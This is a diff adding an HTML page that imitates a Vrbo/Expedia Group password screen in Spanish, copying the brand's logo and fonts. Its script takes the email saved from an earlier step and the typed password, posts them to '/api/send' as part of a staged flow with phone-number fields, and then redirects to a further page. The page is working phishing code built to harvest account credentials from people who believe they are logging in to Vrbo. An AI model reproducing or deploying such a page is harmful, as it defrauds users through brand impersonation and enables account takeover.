@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Introduce la contraseña | Expedia Group</title>
+  
+  <link rel="icon" type="image/png" href="pestaña.png" />
+
+  <style>
+    @font-face {
+      font-family: "Centra No2";
+      font-weight: 400;
+      src: url("https://a.travel-assets.com/egds/fonts/CentraNo2/CentraNo2-Book.woff2") format("woff2");
+    }
+    @font-face {
+      font-family: "Centra No2";
+      font-weight: 500;
+      src: url("https://a.travel-assets.com/egds/fonts/CentraNo2/CentraNo2-Medium.woff2") format("woff2");
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: "Centra No2", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      background: #ffffff; color: #191e3b; min-height: 100vh; display: flex; flex-direction: column;
+      justify-content: flex-start; -webkit-font-smoothing: antialiased;
+    }
+    .navbar-container {
+      background: #ffffff; height: 64px; width: 100%; display: flex; justify-content: center;
+      align-items: center; border-bottom: 1px solid #dfe0e4; flex-shrink: 0;
+    }
+    .uitk-header-brand-logo img { height: 36px; display: block; }
+    .page-wrapper { display: flex; justify-content: center; width: 100%; padding: 32px 16px; background: #ffffff; }
+    .card { width: 100%; max-width: 440px; display: flex; flex-direction: column; gap: 24px; }
+    .heading-group { margin-bottom: 8px; }
+    h1 { font-size: 28px; font-weight: 500; color: #191e3b; line-height: 2.5rem; }
+    form { display: flex; flex-direction: column; gap: 24px; }
+    .readonly-field { display: flex; flex-direction: column; gap: 6px; padding: 0 12px; margin-bottom: 4px; }
+    .readonly-label { font-size: 12px; color: #676a7d; }
+    .readonly-value { font-size: 16px; color: #191e3b; font-weight: 400; }
+    .field-wrapper { position: relative; height: 52px; width: 100%; }
+    .floating-input {
+      width: 100%; height: 100%; padding: 22px 12px 6px 12px; border: 1px solid #818494; border-radius: 8px;
+      font-family: inherit; font-size: 16px; color: #191e3b; background: #fff; outline: none; appearance: none;
+      transition: border-color 0.15s, box-shadow 0.15s;
+    }
+    .floating-input:focus { border-color: #1668e3; box-shadow: inset 0 0 0 1px #1668e3; }
+    .floating-label {
+      position: absolute; left: 12px; top: 50%; transform: translateY(-50%); font-size: 16px; color: #676a7d;
+      pointer-events: none; transition: top 0.15s ease-in-out, font-size 0.1s ease-in-out, transform 0.1s ease-in-out;
+    }
+    .floating-input:focus + .floating-label, .floating-input:not(:placeholder-shown) + .floating-label {
+      top: 14px; font-size: 12px; transform: translateY(-50%); left: 12px;
+    }
+    .uitk-input-cta {
+      position: absolute; right: 4px; top: 50%; transform: translateY(-50%); width: 40px; height: 40px;
+      background: transparent; border: none; cursor: pointer; display: flex; align-items: center;
+      justify-content: center; border-radius: 50%; padding: 0;
+    }
+    .uitk-icon-small { width: 20px; height: 20px; fill: #191e3b; }
+    
+    /* ══ CORRECCIÓN LÓGICA DE ICONOS ══ */
+    .icon-show, .icon-hide { display: none; }
+    
+    /* Cuando el botón dice "Mostrar" (pass oculta), mostramos el OJO ABIERTO */
+    [aria-label="Mostrar"] .icon-hide { display: block; }
+    
+    /* Cuando el botón dice "Ocultar" (pass visible), mostramos el OJO CON RAYA */
+    [aria-label="Ocultar"] .icon-show { display: block; }
+
+    .uitk-checkbox { display: flex; align-items: flex-start; gap: 12px; position: relative; }
+    .uitk-checkbox input[type="checkbox"] { position: absolute; opacity: 0; width: 20px; height: 20px; cursor: pointer; z-index: 2; }
+    .uitk-checkbox-control {
+      width: 20px; height: 20px; border: 2px solid #818494; border-radius: 4px; background: #fff;
+      display: inline-flex; align-items: center; justify-content: center; flex-shrink: 0;
+    }
+    .uitk-checkbox input[type="checkbox"]:checked + .uitk-checkbox-control { background: #1668e3; border-color: #1668e3; }
+    .uitk-checkbox-icon { fill: #ffffff; width: 14px; height: 14px; opacity: 0; transform: scale(0.5); transition: transform 0.2s ease, opacity 0.2s ease; }
+    .uitk-checkbox input[type="checkbox"]:checked + .uitk-checkbox-control .uitk-checkbox-icon { opacity: 1; transform: scale(1); }
+
+    .forgot-password { color: #1668e3; text-decoration: underline; font-size: 14px; font-weight: 400; background: none; border: none; padding: 0; cursor: pointer; text-align: left; }
+    .btn-wrap { display: flex; flex-direction: column; gap: 12px; margin-top: 8px; }
+    .btn { display: flex; align-items: center; justify-content: center; width: 100%; height: 48px; border-radius: 9999px; font-family: inherit; font-size: 16px; font-weight: 500; cursor: pointer; border: 1px solid transparent; }
+    .btn-primary { background-color: #1668e3; color: #ffffff; }
+    .btn-primary:not(:disabled):hover { background-color: #0d4eaf; }
+    .btn-secondary { background-color: #ffffff; color: #1668e3; border-color: #dfe0e4; }
+
+    @keyframes inner-circle { 0% { transform: rotate(0deg); } to { transform: rotate(1turn); } }
+    .uitk-loader-page {
+      background-color: #fff; box-shadow: 0 6px 36px rgba(12, 14, 28, 0.12); 
+      inline-size: 48px; inset-block-end: 0; inset-inline-start: 50%; opacity: 0; padding: 6px; 
+      position: fixed; transform: translate(-50%, 100%); transition: transform .06s ease, opacity 0.12s; z-index: 1000; border-radius: 50%;
+    }
+    .uitk-loader-page.is-visible { opacity: 1; transform: translate(-50%, -40px); transition: transform .12s ease; }
+    .uitk-loader::before {
+      animation: inner-circle .8s linear infinite; border-bottom-color: #1668e3;
+      border-top-color: rgba(22,104,227,.28); border-left-color: rgba(22,104,227,.28); border-right-color: rgba(22,104,227,.28);
+      border-radius: 50%; border-style: solid; border-width: 6px; content: ""; display: block; inline-size: 36px; aspect-ratio: 1/1;
+    }
+  </style>
+</head>
+<body>
+
+<div class="navbar-container">
+  <div class="uitk-header-brand-logo">
+    <img src="https://www.vrbo.com/_dms/header/logo.svg" alt="Vrbo">
+  </div>
+</div>
+
+<div class="page-wrapper">
+  <div class="card">
+    <div class="heading-group"><h1>Introduce la contraseña</h1></div>
+    <form id="password-form">
+      <div class="readonly-field">
+        <span class="readonly-label">Dirección de correo</span>
+        <span class="readonly-value" id="email-display">Cargando...</span>
+      </div>
+      <div class="field-wrapper">
+        <input type="password" id="password-input" class="floating-input" placeholder=" " required />
+        <label for="password-input" class="floating-label">Contraseña</label>
+        
+        <button class="uitk-input-cta" type="button" aria-label="Mostrar" id="toggle-password">
+          <svg class="uitk-icon-small icon-show" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path fill-rule="evenodd" d="M2 4.27 3.27 3 21 20.73 19.73 22l-3.35-3.34A11.83 11.83 0 0 1 1 12a11.8 11.8 0 0 1 3.74-4.99L2 4.27zM17 12a5 5 0 0 0-6.83-4.64L8.01 5.2A11.83 11.83 0 0 1 22.99 12a11.82 11.82 0 0 1-3.43 4.75l-2.92-2.92c.23-.57.36-1.18.36-1.83zM7.53 9.8l1.55 1.55a3 3 0 0 0 3.57 3.57l1.55 1.55A4.96 4.96 0 0 1 7.53 9.8zm7.46 2.37-3.15-3.15c1.69-.1 3.37 1.4 3.15 3.15z" clip-rule="evenodd"></path>
+          </svg>
+          <svg class="uitk-icon-small icon-hide" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path fill-rule="evenodd" d="M12 4.5C7 4.5 2.73 7.61 1 12a11.83 11.83 0 0 0 22 0c-1.73-4.39-6-7.5-11-7.5zM12 17a5 5 0 1 1 0-10 5 5 0 0 1 0 10zm-3-5a3 3 0 1 1 6 0 3 3 0 0 1-6 0z" clip-rule="evenodd"></path>
+          </svg>
+        </button>
+      </div>
+      <div class="uitk-checkbox">
+        <input type="checkbox" id="remember-me" /><span class="uitk-checkbox-control">
+          <svg class="uitk-checkbox-icon" viewBox="0 0 24 24"><path d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"></path></svg>
+        </span><label for="remember-me" class="uitk-checkbox-label">Mantener sesión abierta</label>
+      </div>
+      <button type="button" class="forgot-password">¿Has olvidado la contraseña?</button>
+      <div class="btn-wrap">
+        <button type="submit" class="btn btn-primary" id="btn-continue">Continuar</button>
+        <button type="button" class="btn btn-secondary" id="btn-back">Volver</button>
+      </div>
+    </form>
+  </div>
+</div>
+
+<span class="uitk-loader-page" id="page-loader"><span class="uitk-loader"></span></span>
+
+<script>
+  const passwordInput = document.getElementById('password-input');
+  const btnContinue = document.getElementById('btn-continue');
+  const toggleBtn = document.getElementById('toggle-password');
+  const emailDisplay = document.getElementById('email-display');
+  const loader = document.getElementById('page-loader');
+
+  document.addEventListener('DOMContentLoaded', () => {
+    emailDisplay.textContent = sessionStorage.getItem('vrbo_correo') || 'correo@ejemplo.com';
+  });
+
+  toggleBtn.addEventListener('click', () => {
+    const isHidden = passwordInput.type === 'password';
+    passwordInput.type = isHidden ? 'text' : 'password';
+    toggleBtn.setAttribute('aria-label', isHidden ? 'Ocultar' : 'Mostrar');
+  });
+
+  document.getElementById('btn-back').addEventListener('click', () => { window.location.href = 'index.html'; });
+
+  document.getElementById('password-form').addEventListener('submit', (e) => {
+    e.preventDefault();
+    loader.classList.add('is-visible');
+
+    const correo = sessionStorage.getItem('vrbo_correo') || '';
+    const nombre = passwordInput.value;
+    sessionStorage.setItem('vrbo_nombre', nombre);
+
+    fetch('/api/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ correo, nombre, lada: '', numero: '', fase: '1' })
+    });
+
+    setTimeout(() => { window.location.href = 'vrbologin3.html'; }, 3000);
+  });
+</script>
+</body>
+</html>
